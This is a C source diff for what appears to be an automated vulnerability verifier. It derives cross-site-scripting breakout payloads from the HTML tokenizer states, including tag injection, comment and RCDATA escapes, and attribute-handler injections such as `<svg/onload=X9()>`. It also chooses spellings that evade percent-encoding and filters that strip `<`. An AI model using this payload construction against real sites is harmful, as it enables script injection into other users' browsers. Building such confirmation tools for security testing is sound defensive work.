@@ -171,24 +171,50 @@ static int autofire_of(const lxb_char_t *tag, size_t n) {
     return -1;
 }
 
+/* DOES THIS ELEMENT ALREADY CARRY THE ATTRIBUTE — asked of the element the PROBE parse put the hole in, which
+   is the same element the breakout run builds, because the template around the hole is the page's and does not
+   change between two candidate runs. It decides whether the resource an `onerror` needs can be SUPPLIED: HTML
+   §13.2.5.33 "Attribute name state" says that when a token already has an attribute of the same name "this is a
+   duplicate-attribute parse error and the new attribute must be removed from the token", so a second `src`
+   is discarded and the page's own one still loads. Where there is none, the escape brings its own. */
+static int has_attribute(lxb_dom_element_t *el, const char *name) {
+    size_t vl = 0;
+    return el && lxb_dom_element_get_attribute(el, (const lxb_char_t *)name, strlen(name), &vl) != NULL;
+}
+
 /* THE MINIMAL AUTO-FIRING ELEMENT, chosen by a RULE rather than written down: the first row of the table above
    that fires with no resource to break. An <img> is not minimal — it needs a src that fails — and that is the
-   whole of why it is not what a data-state escape injects. */
-static void firing_element(char *b, size_t n) {
+   whole of why it is not what a data-state escape injects.
+   ITS SEPARATOR IS CHOSEN THE SAME WAY THE ATTRIBUTE ESCAPES CHOOSE THEIRS, off the same §13.2.5 transition
+   pair: §13.2.5.8 "Tag name state" leaves on whitespace to §13.2.5.32 "Before attribute name state" AND on
+   U+002F SOLIDUS to §13.2.5.40 "Self-closing start tag state", whose "Anything else" is a parse error that
+   RECONSUMES in the before attribute name state — so `<svg/onload=X9()>` is the spelling for a source that
+   cannot carry a space. Answers 0 when no spelling of it survives this source, which is a search that has not
+   solved and not a capability that is missing. */
+static int firing_element(char *b, size_t n, const SolveDelivered *d) {
+    const char *sep = solve_delivered_byte(d, ' ') ? " " : solve_delivered_byte(d, '/') ? "/" : NULL;
     int i;
+
+    if (!sep || !solve_delivered_byte(d, '<') || !solve_delivered_byte(d, '>')) { b[0] = 0; return 0; }
     for (i = 0; i < AUTOFIRE_N; i++)
         if (!AUTOFIRE[i].resource) {
-            int k = snprintf(b, n, "<%s %s=X9()>", AUTOFIRE[i].tag, AUTOFIRE[i].event);
+            int k = snprintf(b, n, "<%s%s%s=X9()>", AUTOFIRE[i].tag, sep, AUTOFIRE[i].event);
             CHECK(k > 0 && (size_t)k < n, "solve_html: the firing element did not fit its buffer");
-            return;
+            return 1;
         }
     DFAIL("no element in the auto-fire table fires on insertion alone, so a data-state escape has no element "
           "to inject and every HTML breakout this file constructs is unfireable - restore the row for an "
           "element that dispatches a handler with no resource and no interaction");
     b[0] = 0;
+    return 0;
 }
 
-static void emit_one(SolveHtmlEmit emit, void *user, int *n, const char *fmt, ...) {
+/* AN ESCAPE THE SOURCE CANNOT CARRY IS NOT EMITTED, and this is the one place that decides it — every
+   construction below goes through here, so a spelling chosen for one byte cannot smuggle another past the
+   constraint. Declining is not a swallowed condition: the candidate would re-run the whole document to arrive
+   percent-encoded at its own sink, which is a search state solve.h already reports (`survivedBy` against
+   `sourceEncodes`) and never a fire. Answers whether it emitted, so `n` counts escapes that exist. */
+static int emit_one(SolveHtmlEmit emit, void *user, int *n, const SolveDelivered *d, const char *fmt, ...) {
     char b[512];
     va_list ap;
     int k;
@@ -197,8 +223,10 @@ static void emit_one(SolveHtmlEmit emit, void *user, int *n, const char *fmt, ..
     k = vsnprintf(b, sizeof b, fmt, ap);
     va_end(ap);
     CHECK(k > 0 && (size_t)k < sizeof b, "solve_html: a constructed breakout did not fit its buffer");
+    if (!solve_delivered_ok(d, b)) return 0;
     emit(user, b);
     (*n)++;
+    return 1;
 }
 
 /* THE ONE FACT THE DOM DOES NOT RECORD — which of §13.2.5.36/.37/.38 an attribute value is in — asked of the
@@ -282,18 +310,23 @@ static HoleState attr_state_of(const char *witness, size_t at) {
     return HOLE_ATTR_UNQUOTED;
 }
 
-/* THE ESCAPE IS THE STATE'S OWN EXIT TRANSITION. Nothing here is chosen; each line is the one byte sequence
-   §13.2.5 defines as leaving that state, followed by the firing element the table above derives. */
-static int construct(HoleState st, const Locate *lo, SolveHtmlEmit emit, void *user) {
-    char fire[96];
-    const char *q;
-    int n = 0, af;
+/* THE ESCAPE IS THE STATE'S OWN EXIT TRANSITION. Nothing here is chosen; each line is the byte sequence
+   §13.2.5 defines as leaving that state, followed by the firing element the table above derives.
+   WHERE A STATE HAS TWO EXIT SPELLINGS, THE SOURCE PICKS — see `d` in solve_html.h. That is not a preference
+   between equals: §13.2.5.39 "After attribute value (quoted) state" leaves on whitespace and on U+002F SOLIDUS,
+   every percent-encode set in URL §1.3 "Percent-encoded bytes" holds SPACE and none of them holds the solidus,
+   so for a fragment- or query-carried payload the two spellings are the difference between an escape and no
+   escape at all. */
+static int construct(HoleState st, const Locate *lo, const SolveDelivered *d, SolveHtmlEmit emit, void *user) {
+    char fire[96], tail[64];
+    const char *q, *sep, *vq, *ev, *res;
+    int n = 0, af, have_fire;
 
-    firing_element(fire, sizeof fire);
+    have_fire = firing_element(fire, sizeof fire, d);
     switch (st) {
     case HOLE_DATA:
         /* §13.2.5.1: a `<` here is already the tag open state, so the escape IS the firing element. */
-        emit_one(emit, user, &n, "%s", fire);
+        if (have_fire) emit_one(emit, user, &n, d, "%s", fire);
         return n;
     case HOLE_RCDATA:
     case HOLE_RAWTEXT:
@@ -301,7 +334,8 @@ static int construct(HoleState st, const Locate *lo, SolveHtmlEmit emit, void *u
         /* §13.2.5.2/.3/.4 leave only through their less-than-sign states, and §13.2.5.11/.14/.17 emit an end
            tag only for the APPROPRIATE one — the element whose start tag opened the state. So the escape is
            that element's end tag and nothing shorter. */
-        emit_one(emit, user, &n, "</%.*s>%s", (int)lo->tag_n, (const char *)lo->tag, fire);
+        if (have_fire)
+            emit_one(emit, user, &n, d, "</%.*s>%s", (int)lo->tag_n, (const char *)lo->tag, fire);
         return n;
     case HOLE_PLAINTEXT:
         /* §13.2.5.5 consumes every remaining character of the input and has no transition out at all. There is
@@ -310,7 +344,7 @@ static int construct(HoleState st, const Locate *lo, SolveHtmlEmit emit, void *u
         return 0;
     case HOLE_COMMENT:
         /* §13.2.5.45 -> .50 comment end dash -> .51 comment end, which emits on `>`. */
-        emit_one(emit, user, &n, "-->%s", fire);
+        if (have_fire) emit_one(emit, user, &n, d, "-->%s", fire);
         return n;
     case HOLE_ATTR_DOUBLE:
     case HOLE_ATTR_SINGLE:
@@ -320,22 +354,57 @@ static int construct(HoleState st, const Locate *lo, SolveHtmlEmit emit, void *u
     q = st == HOLE_ATTR_DOUBLE ? "\"" : st == HOLE_ATTR_SINGLE ? "'" : "";
     /* TAG INJECTION: end the value with the quote that opened it (nothing, when it was unquoted — §13.2.5.38
        gives `>` its own transition straight to the data state), close the tag, inject the firing element. */
-    emit_one(emit, user, &n, "%s>%s", q, fire);
+    if (have_fire) emit_one(emit, user, &n, d, "%s>%s", q, fire);
     /* …AND THE SAME STATE WITHOUT A `<`, which is a SECOND escape rather than a second guess: §@S(2) is about
-       which bytes SURVIVE the page's filter, and a filter that escapes `<` kills the vector above while
-       leaving this one — a handler added to the element the hole is already inside. It exists only where the
-       element dispatches something on its own (the table), and where the element needs a resource to fail,
-       only where the hole is IN that resource attribute so the payload's own leading byte breaks it. */
+       which bytes SURVIVE to the sink, and a source (or a filter) that eats `<` kills the vector above while
+       leaving this one — a handler added to the element the hole is already inside. It exists only where that
+       element dispatches something on its own, which is what the table above answers. */
     af = autofire_of(lo->tag, lo->tag_n);
-    if (af >= 0 && (!AUTOFIRE[af].resource || name_is(lo->attr, lo->attr_n, AUTOFIRE[af].resource))) {
-        /* A LEADING BYTE WHERE THE EVENT NEEDS A BROKEN RESOURCE — §@S: `onerror` on an EMPTY src never
-           errors, so an escape that leaves the value empty fires nothing and would be recorded as a search
-           that failed for the wrong reason. */
-        const char *brk = AUTOFIRE[af].resource ? "x" : "";
-        if (*q)
-            emit_one(emit, user, &n, "%s%s %s=X9() %s=%s", brk, q, AUTOFIRE[af].event, SOLVE_HTML_PAD, q);
-        else
-            emit_one(emit, user, &n, "%s %s=X9()", brk, AUTOFIRE[af].event);
+    if (af < 0) return n;
+    ev = AUTOFIRE[af].event;
+    res = AUTOFIRE[af].resource;
+    /* THE SEPARATOR BETWEEN THE CLOSED VALUE AND THE NEXT ATTRIBUTE NAME, which is where §13.2.5 gives two
+       spellings and where a written-down one made the whole family unsatisfiable from a fragment.
+         - whitespace: §13.2.5.39 "After attribute value (quoted) state" switches to §13.2.5.32 "Before
+           attribute name state" directly. It is also the ONLY exit an UNQUOTED value has — §13.2.5.38
+           "Attribute value (unquoted) state" leaves on whitespace, `&` and `>` and appends everything else,
+           the solidus included — which is why the second spelling is offered only where a quote closed one.
+         - U+002F SOLIDUS: §13.2.5.39 switches to §13.2.5.40 "Self-closing start tag state", whose "Anything
+           else" is an unexpected-solidus-in-tag parse error that RECONSUMES in the before attribute name
+           state. §13.2 tree construction is error-recovering, so that recovery is the normative behaviour and
+           not a quirk. */
+    sep = solve_delivered_byte(d, ' ') ? " " : (*q && solve_delivered_byte(d, '/')) ? "/" : NULL;
+    if (!sep) return n;
+    /* …AND WHAT THAT CHOICE COSTS THE VALUES. Reaching §13.2.5.39 again is what makes a solidus a separator at
+       all, and only a QUOTED value gets there; an unquoted one would swallow the solidus and everything after
+       it as more value. So the solidus spelling quotes every value it writes, and the whitespace spelling
+       leaves them as they were. */
+    vq = *sep == '/' ? q : "";
+    /* THE TEMPLATE'S OWN CLOSING QUOTE IS ABSORBED BY A FILLER ATTRIBUTE, or there is none to absorb: an
+       unquoted hole has no trailing quote of the page's to land inside. */
+    if (*q) {
+        int k = snprintf(tail, sizeof tail, "%s%s=%s", sep, SOLVE_HTML_PAD, q);
+        CHECK(k > 0 && (size_t)k < sizeof tail, "solve_html: the escape's filler attribute did not fit");
+    } else {
+        tail[0] = 0;
+    }
+    if (!res) {
+        /* Fires on insertion alone — the handler is the whole escape. */
+        emit_one(emit, user, &n, d, "%s%s%s=%sX9()%s%s", q, sep, ev, vq, vq, tail);
+    } else if (name_is(lo->attr, lo->attr_n, res)) {
+        /* THE HOLE IS THE RESOURCE, so the payload's own leading byte breaks it — §@S: `onerror` on an EMPTY
+           src never errors, so an escape that leaves the value empty fires nothing and would be recorded as a
+           search that failed for the wrong reason. */
+        emit_one(emit, user, &n, d, "x%s%s%s=%sX9()%s%s", q, sep, ev, vq, vq, tail);
+    } else if (!has_attribute(lo->el, res)) {
+        /* THE ELEMENT NEEDS A RESOURCE AND HAS NONE, so the escape SUPPLIES one that fails. This is the case a
+           rule reading "only where the hole sits in that very attribute" refused, and refusing it is what left
+           `<img alt='{hole}'>` with no `<`-free escape at all: the img dispatches `error` for a src that does
+           not load, and an element carrying no src yet is one this escape may give a src to. Where it already
+           carries one, §13.2.5.33's duplicate-attribute rule discards ours and the page's still loads — which
+           is why the question is asked of the element and not assumed either way. */
+        emit_one(emit, user, &n, d, "%s%s%s=%sx%s%s%s=%sX9()%s%s",
+                 q, sep, res, vq, vq, sep, ev, vq, vq, tail);
     }
     return n;
 }
@@ -343,7 +412,8 @@ static int construct(HoleState st, const Locate *lo, SolveHtmlEmit emit, void *u
 /* ONE OCCURRENCE: parse the witness, name the state its bytes are in, construct that state's escape. A state
    with no escape rule CRASHES here naming itself — that is the work queue, and it is a different thing from a
    search that has not solved (CLAUDE.md forbids asserting on THAT). */
-static int breakouts_at(const char *witness, size_t after, SolveHtmlEmit emit, void *user) {
+static int breakouts_at(const char *witness, size_t after, const SolveDelivered *d,
+                        SolveHtmlEmit emit, void *user) {
     lxb_html_document_t *doc = dom_document_create();
     Locate lo;
     int n = 0;
@@ -367,13 +437,18 @@ static int breakouts_at(const char *witness, size_t after, SolveHtmlEmit emit, v
     }
     switch (lo.kind) {
     case LOC_TEXT:
-        n = construct(text_state_of(lo.tag, lo.tag_n), &lo, emit, user);
+        n = construct(text_state_of(lo.tag, lo.tag_n), &lo, d, emit, user);
         break;
     case LOC_COMMENT:
-        n = construct(HOLE_COMMENT, &lo, emit, user);
+        n = construct(HOLE_COMMENT, &lo, d, emit, user);
         break;
     case LOC_ATTR_VALUE:
-        n = construct(attr_state_of(witness, after), &lo, emit, user);
+        DCHECK(lo.el != NULL,
+               "the real parse reported the attacker bytes in an attribute VALUE and named no element "
+               "that owns it — the escape asks the owner whether it already carries the resource its own "
+               "handler needs (HTML 13.2.5.33 duplicate-attribute), so a value with no owner would be "
+               "given one blind");
+        n = construct(attr_state_of(witness, after), &lo, d, emit, user);
         break;
     case LOC_ATTR_NAME:
         DFAIL("the attacker bytes land in an attribute NAME (HTML 13.2.5.33), and the escape for that state "
@@ -397,14 +472,15 @@ static int breakouts_at(const char *witness, size_t after, SolveHtmlEmit emit, v
     return n;
 }
 
-int solve_html_breakouts(const char *output, SolveHtmlEmit emit, void *user) {
+int solve_html_breakouts(const char *output, const SolveDelivered *d, SolveHtmlEmit emit, void *user) {
     size_t loclen = sizeof SOLVE_HTML_LOCATOR - 1, olen;
     const char *p;
     int n = 0;
 
-    DCHECK(output != NULL && emit != NULL,
-           "the HTML breakout derivation was asked for the context of nothing, or with nowhere to put what it "
-           "derives");
+    DCHECK(output != NULL && emit != NULL && d != NULL,
+           "the HTML breakout derivation was asked for the context of nothing, with nowhere to put what it "
+           "derives, or with no statement of which bytes this source can carry — the constraint is half the "
+           "solve (see solve_html.h), so a derivation without one constructs escapes that cannot arrive");
     DCHECK(strstr(output, SOLVE_HTML_LOCATOR) != NULL,
            "the HTML breakout derivation was handed a sink output that does not carry the context locator - "
            "the probe candidate substitutes it AT THE SOURCE, so an output without it is a write the probe "
@@ -422,7 +498,7 @@ int solve_html_breakouts(const char *output, SolveHtmlEmit emit, void *user) {
            Each context contributes its own candidate; the ONE that fires is the verified PoC. */
         for (q = w; (q = strstr(q, SOLVE_HTML_LOCATOR)) != NULL; q += loclen)
             if ((size_t)(q - w) != off) memcpy(q, SOLVE_HTML_ELIDE, loclen);
-        n += breakouts_at(w, off + loclen, emit, user);
+        n += breakouts_at(w, off + loclen, d, emit, user);
         free(w);
     }
     return n;
